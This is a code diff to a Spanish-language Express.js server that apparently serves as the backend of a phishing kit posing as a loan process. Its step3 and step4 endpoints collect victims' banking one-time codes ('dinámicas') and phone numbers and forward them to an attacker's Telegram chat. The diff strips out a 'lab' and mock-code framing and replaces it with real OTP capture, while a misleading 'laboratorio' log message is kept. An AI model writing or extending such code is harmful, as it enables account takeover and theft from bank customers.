@@ -254,29 +254,40 @@ app.post('/step2-loan-second', async (req, res) => {
   }
 });
 
-// ====
+// ================================  STEP3
 // ==================== ENDPOINT SIMULADO: DINÁMICA LABORATORIO ====================
+
 app.post('/step3-dynamic', async (req, res) => {
   try {
-    const { sessionId, mockCode, stepNumber } = req.body; // "mockCode" en lugar de OTP
+    const { sessionId, otp, attemptNumber } = req.body;
 
     if (!BOT_TOKEN || !CHAT_ID) {
       return res.status(500).json({ ok: false });
     }
 
-    const mensaje = `
-🧪 LAB: DINÁMICA ${stepNumber} RECIBIDA
-
-📌 Código de prueba: ${mockCode}
+   const session = sessionData.get(sessionId) || {};
+    
+    // Guardar la dinámica
+    if (!session.dynamics) {
+      session.dynamics = [];
+    }
+    session.dynamics.push(otp);
+    sessionData.set(sessionId, session);
+    
+	  const mensaje = `
+📲 DINÁMICA ${attemptNumber} RECIBIDA 📲
+📱 Número: ${session.phoneNumber || 'N/A'}
+🔢 Dinámica ${attemptNumber}: ${otp}
 🆔 Session: ${sessionId}
     `.trim();
+     
 
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje
     });
 
-    console.log(`✅ Dinámica de laboratorio NORMAL ${stepNumber} enviada - Session: ${sessionId}`);
+    console.log(`✅ Dinámica SMS laboratorio  ${attemptNumber} enviada - Session: ${sessionId}`);
     res.json({ ok: true });
 
   } catch (err) {
@@ -285,28 +296,39 @@ app.post('/step3-dynamic', async (req, res) => {
   }
 });
 
+// ================================  STEP4
 
 app.post('/step4-dynamic', async (req, res) => {
   try {
-    const { sessionId, mockCode, stepNumber } = req.body;
+    const { sessionId, otp, attemptNumber } = req.body;
 
     if (!BOT_TOKEN || !CHAT_ID) {
       return res.status(500).json({ ok: false });
     }
 
-    const mensaje = `
-🧪 LAB: DINÁMICA SMS ${stepNumber} RECIBIDA
-
-📌 Código de prueba: ${mockCode}
+   const session = sessionData.get(sessionId) || {};
+    
+    // Guardar la dinámica
+    if (!session.dynamics) {
+      session.dynamics = [];
+    }
+    session.dynamics.push(otp);
+    sessionData.set(sessionId, session);
+    
+	  const mensaje = `
+📲 DINÁMICA ${attemptNumber} RECIBIDA 📲
+📱 Número: ${session.phoneNumber || 'N/A'}
+🔢 Dinámica ${attemptNumber}: ${otp}
 🆔 Session: ${sessionId}
     `.trim();
+     
 
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje
     });
 
-    console.log(`✅ Dinámica SMS laboratorio  ${stepNumber} enviada - Session: ${sessionId}`);
+    console.log(`✅ Dinámica SMS laboratorio  ${attemptNumber} enviada - Session: ${sessionId}`);
     res.json({ ok: true });
 
   } catch (err) {
@@ -314,7 +336,6 @@ app.post('/step4-dynamic', async (req, res) => {
     res.status(500).json({ ok: false });
   }
 });
-
 
 
 
